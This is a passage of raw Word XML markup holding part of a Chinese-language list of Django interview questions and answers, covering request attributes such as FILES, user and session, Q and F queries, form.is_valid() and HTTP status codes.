        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>&lt;input type="file" name="" /&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>标签中</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>name</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>属性的值，</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>FILES</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>中的每一个</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>value</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>同时也是一个标准的</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>python</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>字典对象，包含下面三个</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Keys</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43A3464A"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69CC5AD3"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filename</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>：</w:t>
      </w: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上传文件名，用字符串表示</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FC5379A"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xml:space="preserve"># content_type: </w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>上传文件的</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Content Type</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BF2FED1"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content</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>：</w:t>
      </w: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上传文件的原始内容</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="242652AC"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D3E538B"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B17EB25"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user</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>：</w:t>
      </w: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是一个</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>django.contrib.auth.models.User</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>对象，代表当前登陆的用户。如果访问用户当前</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FA4906E"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没有登陆，</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>user</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>将被初始化为</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>django.contrib.auth.models.AnonymousUser</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的实例。你</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5745A952"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可以通过</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>user</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>is_authenticated()</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>方法来辨别用户是否登陆：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="267D9511"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if req.user.is_authenticated();</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>只有激活</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>中的</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>AuthenticationMiddleware</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3ACC84B1"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lastRenderedPageBreak/>
        <w:t xml:space="preserve"># </w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>时该属性才可用</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="530B5A22"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="758DB067"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 session</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>唯一可读写的属性，代表当前会话的字典对象；自己有激活</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>中的</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>session</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>支持时该属性才可用。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57B54864" w14:textId="77777777" w:rsidR="006B2B80" w:rsidRPr="002437D1" w:rsidRDefault="006B2B80" w:rsidP="002437D1">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437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>get_full_path()</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>方法，获取</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>HTTP GET</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>方式请求传参，的</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>地址</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4303C384" w14:textId="3FF10FDB" w:rsidR="006B2B80" w:rsidRPr="003A7EFD" w:rsidRDefault="002437D1"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5" w:name="t13"/>
      <w:bookmarkStart w:id="6" w:name="t14"/>
      <w:bookmarkEnd w:id="5"/>
      <w:bookmarkEnd w:id="6"/>
      <w:r w:rsidRPr="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>02</w:t>
      </w:r>
      <w:r w:rsidR="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>5</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HTTP</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>响应常见状态码分类？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="027088C2" w14:textId="77777777" w:rsidR="006B2B80" w:rsidRDefault="006B2B80" w:rsidP="006B2B80">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00B9AF32" wp14:editId="6E82C337">
            <wp:extent cx="6273165" cy="234696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298561" cy="2356859"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A66F2C1" w14:textId="7C58D556" w:rsidR="006B2B80" w:rsidRDefault="008721E6" w:rsidP="003A7EFD">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:wordWrap w:val="0"/>
        <w:spacing w:line="340" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="2"/>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial"/>
          <w:color w:val="4F4F4F"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="7" w:name="t15"/>
      <w:bookmarkStart w:id="8" w:name="t16"/>
      <w:bookmarkStart w:id="9" w:name="t17"/>
      <w:bookmarkStart w:id="10" w:name="t18"/>
      <w:bookmarkStart w:id="11" w:name="t21"/>
      <w:bookmarkStart w:id="12" w:name="t22"/>
      <w:bookmarkEnd w:id="7"/>
      <w:bookmarkEnd w:id="8"/>
      <w:bookmarkEnd w:id="9"/>
      <w:bookmarkEnd w:id="10"/>
      <w:bookmarkEnd w:id="11"/>
      <w:bookmarkEnd w:id="12"/>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31</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中查询</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>queryset</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>时什么情况下用</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Q</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A7BBC8A" w14:textId="77777777"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color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>#F:对数据本身的不同字段进行操作 如:</w:t>
      </w:r>
      <w:r w:rsidRPr="006425B6">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>比较</w:t>
      </w:r>
      <w:r w:rsidRPr="006425B6">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>和更新，对数据进行加减操作</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27FCDF96" w14:textId="77777777"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color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>#Q：用于构造复杂的查询条件 如：&amp; |操作</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B1A5516" w14:textId="36D7EBAA" w:rsidR="006B2B80" w:rsidRDefault="008721E6" w:rsidP="003A7EFD">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:wordWrap w:val="0"/>
        <w:spacing w:line="340" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="2"/>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial"/>
          <w:color w:val="4F4F4F"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="13" w:name="t23"/>
      <w:bookmarkEnd w:id="13"/>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32</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中想验证表单提交是否格式正确需要用到</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Form</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>中的哪个函数？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C3EED6F" w14:textId="77777777" w:rsidR="006B2B80" w:rsidRPr="006425B6" w:rsidRDefault="006B2B80" w:rsidP="006425B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425B6">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>  form.is_valid() :返回布尔值</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FB64EAF" w14:textId="1093191C" w:rsidR="006B2B80" w:rsidRDefault="008721E6" w:rsidP="003A7EFD">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:wordWrap w:val="0"/>
        <w:spacing w:line="340" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="2"/>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial"/>
          <w:color w:val="4F4F4F"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="14" w:name="t24"/>
      <w:bookmarkStart w:id="15" w:name="t25"/>
      <w:bookmarkEnd w:id="14"/>
      <w:bookmarkEnd w:id="15"/>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34</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中如何读取和保存</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>session</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>，整个</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>session</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>的运行机制是什么？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3727BE6D" w14:textId="77777777" w:rsidR="008721E6" w:rsidRDefault="006B2B80" w:rsidP="006B2B80">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="300" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>更新</w:t>
      </w:r>
    </w:p>
